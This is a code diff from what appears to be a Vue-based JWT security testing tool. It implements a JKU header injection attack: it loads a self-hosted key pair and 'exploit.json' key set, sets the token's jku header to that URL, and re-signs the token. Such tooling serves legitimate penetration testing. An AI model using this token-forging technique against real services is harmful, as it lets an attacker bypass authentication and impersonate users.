@@ -303,8 +303,31 @@ const jwk_injection_attack = async () => {
 }
 
 const jku_injection_attack = async () => {
-    await generate_jwk()
-    console.log(btoa(JSON.stringify(key_pair.value.pub, null, 2)))
+    if (!selected_alg.value.includes("HS")) {
+
+        let priv = await fetch(selected_alg.value + "/key.json")
+        let priv_res = await priv.text()
+        key_pair.value.priv = JSON.parse(priv_res)
+
+        let pub = await fetch(selected_alg.value + "/exploit.json")
+        let pub_res = await pub.text()
+        key_pair.value.pub = JSON.parse(pub_res).keys[0]
+
+        let h = JSON.parse(header.value)
+        h.alg = selected_alg.value
+        h.typ = "JWT"
+        h.kid = key_pair.value.pub.kid
+        h.jku = window.location.origin + "/" + selected_alg.value + "/exploit.json"
+        header.value = JSON.stringify(h, null, 2)
+        encodeJwt()
+
+
+
+
+    } else {
+        alert("Only RSA, ES, and PSS algorithms support JKU injection.")
+    }
+
 }
 
 onMounted(async () => {
